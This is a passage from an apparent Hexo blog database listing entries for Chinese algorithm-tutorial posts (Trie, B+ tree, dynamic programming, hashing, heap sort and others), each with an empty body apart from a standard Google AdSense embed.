[]).push({});\n</script>"},{"title":"算法-AC自动机","date":"2019-09-17T08:26:01.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-AC自动机.md","raw":"---\ntitle: 算法-AC自动机\ndate: 2019-09-17 16:26:01\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-AC自动机","published":1,"updated":"2019-09-17T08:26:01.556Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gu001io25tx25pr0y1","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-Trie树","date":"2019-09-17T08:25:52.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-Trie树.md","raw":"---\ntitle: 算法-Trie树\ndate: 2019-09-17 16:25:52\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-Trie树","published":1,"updated":"2019-09-17T08:25:52.296Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gv001mo25tnlx94vvf","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-B+树","date":"2019-09-17T08:29:49.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-B-树.md","raw":"---\ntitle: 算法-B+树\ndate: 2019-09-17 16:29:49\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-B-树","published":1,"updated":"2019-09-17T08:29:49.599Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gw001po25t4gi5cjmv","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-二叉树基础（下）","date":"2019-09-17T08:23:33.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-二叉树基础（下）.md","raw":"---\ntitle: 算法-二叉树基础（下）\ndate: 2019-09-17 16:23:33\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-二叉树基础（下）","published":1,"updated":"2019-09-17T08:23:33.502Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gx001to25t4gf1aa6t","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-位图算法","date":"2019-09-17T08:29:08.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-位图算法.md","raw":"---\ntitle: 算法-位图算法\ndate: 2019-09-17 16:29:08\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-位图算法","published":1,"updated":"2019-09-17T08:29:08.359Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gz001vo25tvsd75w07","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-动态规划实战","date":"2019-09-17T08:28:37.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-动态规划实战.md","raw":"---\ntitle: 算法-动态规划实战\ndate: 2019-09-17 16:28:37\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-动态规划实战","published":1,"updated":"2019-09-17T08:28:37.803Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2h0001xo25tin3fggbd","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-分治算法","date":"2019-09-17T08:26:20.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-分治算法.md","raw":"---\ntitle: 算法-分治算法\ndate: 2019-09-17 16:26:20\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-分治算法","published":1,"updated":"2019-09-17T08:26:20.970Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2h1001zo25twf88vsyk","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-动态规划理论","date":"2019-09-17T08:28:28.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-动态规划理论.md","raw":"---\ntitle: 算法-动态规划理论\ndate: 2019-09-17 16:28:28\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-动态规划理论","published":1,"updated":"2019-09-17T08:28:28.654Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2h20021o25tbbjn4iuo","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-初识动态规划","date":"2019-09-17T08:28:19.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-初识动态规划.md","raw":"---\ntitle: 算法-初识动态规划\ndate: 2019-09-17 16:28:19\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-初识动态规划","published":1,"updated":"2019-09-17T08:28:19.505Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2h30022o25tz2d8jq3l","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-向量空间","date":"2019-09-17T08:29:33.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-向量空间.md","raw":"---\ntitle: 算法-向量空间\ndate: 2019-09-17 16:29:33\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-向量空间","published":1,"updated":"2019-09-17T08:29:33.039Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2h50024o25t3z50pt2o","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-哈希算法（上）","date":"2019-09-17T08:23:04.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-哈希算法（上）.md","raw":"---\ntitle: 算法-哈希算法（上）\ndate: 2019-09-17 16:23:04\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-哈希算法（上）","published":1,"updated":"2019-09-17T08:23:04.525Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2h60025o25t2a6rh31l","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-哈希算法（下）","date":"2019-09-17T08:23:11.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-哈希算法（下）.md","raw":"---\ntitle: 算法-哈希算法（下）\ndate: 2019-09-17 16:23:11\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-哈希算法（下）","published":1,"updated":"2019-09-17T08:23:11.709Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2h70026o25tsqhq6j2r","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-回溯算法","date":"2019-09-17T08:28:02.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-回溯算法.md","raw":"---\ntitle: 算法-回溯算法\ndate: 2019-09-17 16:28:02\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-回溯算法","published":1,"updated":"2019-09-17T08:28:02.424Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2h80029o25trad1k5u4","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-堆和堆排序","date":"2019-09-17T08:24:37.000Z","_content":"\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-堆和堆排序.md","raw":"---\ntitle: 算法-堆和堆排序\ndate: 2019-09-17 16:24:37\ntags:\ncategories:\n---\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-堆和堆排序","published":1,"updated":"2019-09-17T08:24:37.937Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2h9002bo25tz1qcle4i","content":"<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins 